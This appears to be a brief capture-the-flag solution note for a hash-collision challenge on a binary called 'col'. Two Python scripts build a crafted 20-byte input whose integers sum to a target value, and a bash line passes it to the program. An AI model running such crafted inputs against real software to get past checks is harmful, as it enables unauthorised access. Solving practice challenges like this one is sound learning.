

## using struct
```python
import struct

# Target value (magic number)
target = 0x21DD09EC

# Choose 4 equal values
val = 0x01010101  # You can choose any int really
partial_sum = val * 4

# Compute the last one
last_val = target - partial_sum

# Now pack them into binary (little-endian)
payload = struct.pack("<IIII", val, val, val, val) + struct.pack("<I", last_val)

# Save or send the payload
print("Payload (hex):", payload.hex())
print(bytes.fromhex(payload.hex()))
```

## using pwntools 
```python 
from pwn import p32

# Target value (magic number)
target = 0x21DD09EC

# Choose 4 equal values
val = 0x01010101  # You can choose any int really
partial_sum = val * 4

# Compute the last one
last_val = target - partial_sum

payload = b''
payload += p32(val) * 4
payload += p32(last_val)

print("Payload (hex):", payload.hex())
print(bytes.fromhex(payload.hex()))
```

exploit is

```bash
./col $(echo -ne "{payload}")
```



